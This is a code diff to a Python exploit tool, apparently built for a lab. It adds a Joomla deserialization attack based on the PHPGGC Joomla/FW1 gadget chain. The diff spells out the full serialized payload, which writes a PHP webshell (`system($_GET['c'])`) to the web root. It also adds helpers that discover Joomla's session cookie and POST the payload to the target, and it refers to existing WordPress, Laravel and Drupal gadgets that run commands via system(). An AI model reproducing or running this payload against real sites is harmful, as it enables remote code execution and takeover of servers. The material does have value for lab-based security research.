@@ -16,6 +16,7 @@ captured in recon, then verified against the real bytes on disk.
 from __future__ import annotations
 
 import os
+import re
 import socket
 import subprocess
 import urllib.parse
@@ -79,9 +80,10 @@ def set_shell(name: str) -> None:
 
 def set_gadget(name: str, arg: str = "") -> None:
     """Choose the planted record: 'filecache' (lab gadget, writes a
-    webshell) or a real framework gadget that runs arg via system():
-    'wordpress' (WP core), 'laravel' (PHPGGC Laravel/RCE9) or
-    'drupal' (PHPGGC Drupal7/RCE1 from Drupal core)."""
+    webshell), a framework gadget that runs arg via system()
+    ('wordpress' WP core, 'laravel' PHPGGC Laravel/RCE9, 'drupal'
+    PHPGGC Drupal7/RCE1), or 'joomla' (PHPGGC Joomla/FW1 - a file
+    write whose random shell is then probed)."""
     global GADGET, WP_ARG
     GADGET, WP_ARG = name, arg
 
@@ -96,6 +98,29 @@ SEP = b":" + b'"'
 
 
 def obj_bytes() -> bytes:
+    if GADGET == "joomla":
+        # PHPGGC Joomla/FW1 (3.9.0 <= 5.2.1; fixed in 5.2.2's
+        # __wakeup guard), byte-identical to phpggc's output for the
+        # same arguments: FormattedtextLogger::__destruct writes the
+        # deferred LogEntry's message to the configured path via
+        # File::write() - here this run's random shell.
+        path = f"/var/www/html/{SHELL_NAME}".encode()
+        content = b"<?php system($_GET['c']);"
+        return (b'evil|O:41:"Joomla\\CMS\\Log\\Logger\\'
+                b'FormattedtextLogger":6:{'
+                b's:8:"\x00*\x00defer";b:1;'
+                b's:10:"\x00*\x00options";'
+                b'a:1:{s:16:"text_file_no_php";b:1;}'
+                b's:7:"\x00*\x00path";s:'
+                + str(len(path)).encode() + SEP + path
+                + b'";s:18:"\x00*\x00deferredEntries";a:1:{i:0;'
+                b'O:23:"Joomla\\CMS\\Log\\LogEntry":3:'
+                b'{s:4:"date";s:10:"1234567890";s:4:"time";s:1:"t";'
+                b's:1:"f";s:'
+                + str(len(content)).encode() + SEP + content
+                + b'";}}'
+                b's:9:"\x00*\x00format";s:3:"{F}";'
+                b's:9:"\x00*\x00fields";a:1:{i:0;s:1:"F";}}')
     if GADGET == "drupal":
         # PHPGGC Drupal7/RCE1 (7.0.8 <= 7.98), verified against the
         # shipped Drupal 7.98: SchemaCache::__destruct persists the
@@ -550,6 +575,48 @@ def laravel_store_bio(sid: str, payload: bytes) -> bytes:
     req = (f"POST /bio HTTP/1.1\r\nHost: localhost\r\n"
            f"Cookie: PHPSESSID={sid}; laravel_session={laravel}\r\n"
            f"X-XSRF-TOKEN: {urllib.parse.unquote(xsrf)}\r\n"
+           f"Content-Type: application/x-www-form-urlencoded\r\n"
+           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
+           ).encode() + body
+    _, resp = _http(PORT, req, read_resp=True)
+    return resp
+
+
+
+def joomla_cookie_name(port: int, timeout: float = 10.0) -> str:
+    """Discover Joomla's session cookie name the natural way.
+
+    Joomla names its session cookie after a per-installation hash
+    (measured: 32 lowercase hex, stable across requests, different per
+    install) - a plain GET / carries it in Set-Cookie.
+    """
+    req = (b"GET / HTTP/1.1\r\nHost: localhost\r\n"
+           b"Connection: close\r\n\r\n")
+    _, resp = _http(port, req, read_resp=True, timeout=timeout)
+    cookies = []
+    for line in resp.split(b"\r\n"):
+        if line.lower().startswith(b"set-cookie:"):
+            kv = line.split(b":", 1)[1].strip().split(b";", 1)[0]
+            name, _, value = kv.partition(b"=")
+            cookies.append((name.decode(), value.decode()))
+    # prefer the cookie whose value is a session id (32 hex)
+    for name, value in cookies:
+        if re.fullmatch(r"[0-9a-f]{32}", value) and name != "PHPSESSID":
+            return name
+    raise OSError("no session cookie in the Joomla response")
+
+
+def joomla_store_bio(sid: str, payload: bytes, cookie_name: str) -> bytes:
+    """Store the payload on the Joomla target through /index.php.
+
+    The lab's system plugin (installed by the image's own extension
+    mechanism) stores the field in Joomla's native session on
+    onAfterInitialise - the request carries Joomla's own session
+    cookie (discovered, not guessed) with our sid.
+    """
+    body = b"bio=" + payload
+    req = (f"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
+           f"Cookie: {cookie_name}={sid}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode() + body
